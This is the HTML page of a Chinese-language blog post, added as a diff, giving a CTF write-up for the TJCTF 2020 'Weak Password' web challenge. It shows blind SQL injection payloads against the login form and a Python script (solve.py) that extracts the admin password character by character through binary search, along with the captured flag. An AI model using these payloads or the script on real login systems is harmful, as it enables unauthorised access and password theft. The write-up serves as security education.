@@ -1,0 +1,1076 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-TW">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222"/>
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-bounce.min.css?v=1.0.2"/>
+
+
+
+
+
+
+
+  <meta name="google-site-verification" content="5POakq1iR3soBgSPJX__DRW6QXkfxgZV9yNcnWQ95j0"/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!--<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>-->
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/v4-shims.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0"/>
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-tail.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-tail.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/tail.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+  <meta name="description" content="Writeups 搬自 MacacaHub TJCTF 2020 Writeups 這題雖然叫Weak Password，但我當時遇到真的戳不出來呢 ; w ; 最後賽後隊友提點才知道原來是Blind SQL injection，平常我只拿&#39; or 1&#x3D;1 --戳戳根本是小兒科ww">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TJCTF 2020 - Weak Password(Web)">
+<meta property="og:url" content="https://yctseng1227.github.io/200529-tjctf-weakpassword/index.html">
+<meta property="og:site_name" content="yctseng&#39;s Blog">
+<meta property="og:description" content="Writeups 搬自 MacacaHub TJCTF 2020 Writeups 這題雖然叫Weak Password，但我當時遇到真的戳不出來呢 ; w ; 最後賽後隊友提點才知道原來是Blind SQL injection，平常我只拿&#39; or 1&#x3D;1 --戳戳根本是小兒科ww">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/01.png?raw=true">
+<meta property="og:image" content="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/01.png?raw=true">
+<meta property="og:image" content="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/03.png?raw=true">
+<meta property="og:image" content="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/04.png?raw=true">
+<meta property="og:image" content="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/05.png?raw=true">
+<meta property="article:published_time" content="2020-05-29T03:37:12.000Z">
+<meta property="article:modified_time" content="2020-05-30T12:34:08.360Z">
+<meta property="article:author" content="yctseng">
+<meta property="article:tag" content="TJCTF 2020">
+<meta property="article:tag" content="Web Challenge">
+<meta property="article:tag" content="blind SQLi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/01.png?raw=true">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://yctseng1227.github.io/200529-tjctf-weakpassword/"/>
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>TJCTF 2020 - Weak Password(Web) | yctseng's Blog</title>
+  
+
+
+
+
+  <script async src="//www.googletagmanager.com/gtag/js?id=UA-137531005-1"></script>
+  <script>
+    var host = window.location.hostname;
+    if (host !== "localhost" || !true) {
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-137531005-1');
+    }
+  </script>
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<meta name="generator" content="Hexo 4.2.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-TW">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yctseng's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">ヾ(〃^∇^)ﾉ</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切換導航欄">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首頁</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>關於</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>分類<span class="badge">9</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>標籤<span class="badge">24</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>文章<span class="badge">28</span></a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yctseng1227.github.io/200529-tjctf-weakpassword/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yctseng"/>
+      <meta itemprop="description" content="競程廢物、資安菜鳥 >_<"/>
+      <meta itemprop="image" content="/images/yctseng.png"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yctseng's Blog"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">TJCTF 2020 - Weak Password(Web)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+
+              
+                
+              
+
+              <time title="創建時間：2020-05-29 11:37" itemprop="dateCreated datePublished" datetime="2020-05-29T11:37:12+08:00">2020-05-29</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             閱讀次數： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Writeups 搬自 <a href="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/readme.md" target="_blank" rel="noopener">MacacaHub TJCTF 2020 Writeups</a></p>
+<p>這題雖然叫Weak Password，但我當時遇到真的戳不出來呢 ; w ;</p>
+<p>最後賽後隊友提點才知道原來是<strong>Blind SQL injection</strong>，平常我只拿<code>&#39; or 1=1 --</code>戳戳根本是小兒科ww</p>
+<a id="more"></a>
+<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>It seems your login bypass skills are now famous! One of my friends has given you a challenge: figure out his password on this <a href="https://weak_password.tjctf.org/" target="_blank" rel="noopener">site</a>. He’s told me that his username is admin, and that his password is made of up only lowercase letters and numbers. (Wrap the password with tjctf{…})</p>
+<p><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/01.png?raw=true" alt=""></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>標題同樣為<strong>Weak Password</strong>，T貓盃只有<code>admin</code>:<code>admin</code>，這裡反而沒有這麼簡單XD</p>
+<p>從題目給定<code>username</code>為<code>admin</code>，以及從<code>source code</code>可以看到<code>SQL語法</code>以及一些欄位資訊，我們可以猜到這題要用<strong>Blind SQL injection</strong>，一些基本的猜法可以參考<a href="https://www.twblogs.net/a/5d0d7134bd9eee1ede0450b0" target="_blank" rel="noopener">此篇</a>，當然也可以從網頁把<code>password</code>每個字元慢慢猜出來，但身為未來工程屍… 還是寫個Code吧 : )</p>
+<p><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/01.png?raw=true" alt=""></p>
+<p>How to Guess ?</p>
+<p>透過<code>SQL injection</code>並利用登入結果判斷是否成功，想辦法從<code>username</code>撈出我們想要的資訊。</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/03.png?raw=true" alt=""></div><div class="group-picture-column" style="width: 50%;"><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/04.png?raw=true" alt=""></div></div></div></div>
+<p>例如，猜<code>password</code>長度：</p>
+<p><code>admin&#39; and length(password) &gt; 13 --</code> —&gt; success</p>
+<p><code>admin&#39; and length(password) &gt; 14 --</code> —&gt; fail</p>
+<p><code>admin&#39; and length(password) = 14 --</code> —&gt; success</p>
+<p>可以猜到<code>password</code>長度為14。<br><br></p>
+<p>又例如，猜<code>password</code>第一個字元：</p>
+<p><code>admin&#39; and unicode(substr(password, 1)) &gt; unicode(&#39;a&#39;) --</code> —&gt; success</p>
+<p><code>admin&#39; and unicode(substr(password, 1)) &gt; unicode(&#39;b&#39;) --</code> —&gt; fail</p>
+<p><code>admin&#39; and unicode(substr(password, 1)) = unicode(&#39;b&#39;) --</code> —&gt; success</p>
+<p>可以猜到<code>password</code>第一個字元為<code>b</code>。</p>
+<p><br><br>再來就是寫Code了，可以搭配 <strong>Binary search</strong> 加速搜尋~</p>
+<p>然後用回傳的request長度判斷結果是否成功。</p>
+<figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send request and get result</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject</span><span class="params">(n, opr, char)</span>:</span></span><br><span class="line">    url = <span class="string">'https://weak_password.tjctf.org/login'</span></span><br><span class="line">    payload = &#123;<span class="string">"username"</span>: <span class="string">"admin' and unicode(substr(password, &#123;&#125;)) &#123;&#125; unicode('&#123;&#125;')-- "</span>.format(n, opr,char), <span class="string">"password"</span>: <span class="string">"123"</span>&#125;</span><br><span class="line">    r = requests.post(url, data=payload)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span> <span class="keyword">if</span> len(r.text)==<span class="number">1842</span> <span class="keyword">else</span> <span class="keyword">False</span> <span class="comment">#1842:success</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line">li = list(string.digits + string.ascii_lowercase)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">	l = <span class="number">0</span></span><br><span class="line">    r = len(li) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># end up binary search if it can't checkout any character</span></span><br><span class="line">    <span class="keyword">if</span> inject(i, <span class="string">'&gt;'</span>, li[<span class="number">0</span>]) == <span class="keyword">False</span>:</span><br><span class="line">        print(<span class="string">'password: '</span>+res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        mid = (l +(r+<span class="number">1</span>)) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#print(l, r, mid)</span></span><br><span class="line">        <span class="keyword">if</span> inject(i, <span class="string">'='</span>, li[mid]):</span><br><span class="line">            res = res + li[mid]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> inject(i, <span class="string">'&gt;'</span>, li[mid]):</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">elif</span> inject(i, <span class="string">'&lt;'</span>, li[mid]):</span><br><span class="line">            r = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure>
+<h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><p><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/05.png?raw=true" width="500" align="center"/></p>
+<blockquote>
+<p>tjctf{blindsqli14519}</p>
+</blockquote>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <div>
+        
+          <div>
+    
+        <div style="width: 168px; margin: auto"><img src="/imges/end.png"></div>
+    
+</div>
+        
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/TJCTF-2020/" rel="tag">🏷 TJCTF 2020</a>
+          
+            <a href="/tags/Web-Challenge/" rel="tag">🏷 Web Challenge</a>
+          
+            <a href="/tags/blind-SQLi/" rel="tag">🏷 blind SQLi</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/200426-goodbye-dajianhu/" rel="next" title="さようなら、大江戶。">
+                <i class="fa fa-chevron-left"></i> さようなら、大江戶。
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概要
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/yctseng.png"
+                alt="yctseng"/>
+            
+              <p class="site-author-name" itemprop="name">yctseng</p>
+              <div class="site-description motion-element" itemprop="description">競程廢物、資安菜鳥 >_<</div>
+          </div>
+
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/yctseng1227" title="GitHub &rarr; https://github.com/yctseng1227" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:gene26620560@gmail.com" title="E-Mail &rarr; mailto:gene26620560@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://www.facebook.com/people/曾煜鈞/100005578654187" title="Facebook &rarr; https://www.facebook.com/people/曾煜鈞/100005578654187" rel="noopener" target="_blank"><i class="fa fa-fw fa-facebook-f"></i>Facebook</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="http://codeforces.com/profile/yctseng" title="Codeforces &rarr; http://codeforces.com/profile/yctseng" rel="noopener" target="_blank"><i class="fa fa-fw fa-poll"></i>Codeforces</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://ctftime.org/user/65888" title="CTFtime &rarr; https://ctftime.org/user/65888" rel="noopener" target="_blank"><i class="fa fa-fw fa-flag-checkered"></i>CTFtime</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://www.facebook.com/MacacaHub-107811803945876/" title="MacacaHub &rarr; https://www.facebook.com/MacacaHub-107811803945876/" rel="noopener" target="_blank"><i class="fa fa-fw fa-chess-queen"></i>MacacaHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友站Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.tinytsunami.info" title="https://www.tinytsunami.info" rel="noopener" target="_blank">羊羽手札</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Description"><span class="nav-number">1.</span> <span class="nav-text">Description</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Result"><span class="nav-number">2.1.</span> <span class="nav-text">Result</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <!--<i class="fa fa-user"></i>-->
+    <i class="fas fa-snowflake fa-spin"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yctseng</span>
+
+  
+
+  
+</div>
+
+
+<!--
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 強力驅動 v4.2.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.0</div>
+
+
+
+-->
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="訪客總數">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="總瀏覽次數">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+  
+
+<script>
+  var disqus_config = function() {
+    this.page.url = "https://yctseng1227.github.io/200529-tjctf-weakpassword/";
+    this.page.identifier = "200529-tjctf-weakpassword/";
+    this.page.title = 'TJCTF 2020 - Weak Password(Web)';
+    };
+  function loadComments() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://yctseng1227-blog.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', '' + +new Date());
+    (d.head || d.body).appendChild(s);
+  }
+  
+    loadComments();
+  
+</script>
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script>
+  $('.highlight').each(function(i, e) {
+    var $wrap = $('<div>').addClass('highlight-wrap');
+    $(e).after($wrap);
+    $wrap.append($('<button>').addClass('copy-btn').append('複製').on('click', function(e) {
+      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+        return $(e).text();
+      }).toArray().join('\n');
+      var ta = document.createElement('textarea');
+      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+      ta.style.top = yPosition + 'px'; // Prevent page scroll
+      ta.style.position = 'absolute';
+      ta.style.opacity = '0';
+      ta.readOnly = true;
+      ta.value = code;
+      document.body.appendChild(ta);
+      ta.select();
+      ta.setSelectionRange(0, code.length);
+      ta.readOnly = false;
+      var result = document.execCommand('copy');
+      
+        if (result) $(this).text('複製成功');
+        else $(this).text('複製失敗');
+      
+      ta.blur(); // For iOS
+      $(this).blur();
+    })).on('mouseleave', function(e) {
+      var $b = $(this).find('.copy-btn');
+      setTimeout(function() {
+        $b.text('複製');
+      }, 300);
+    }).append(e);
+  })
+</script>
+
+
+  
+
+  
+
+
+
+  <script type="text/javascript" src="/js/hexo_resize_image.js"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
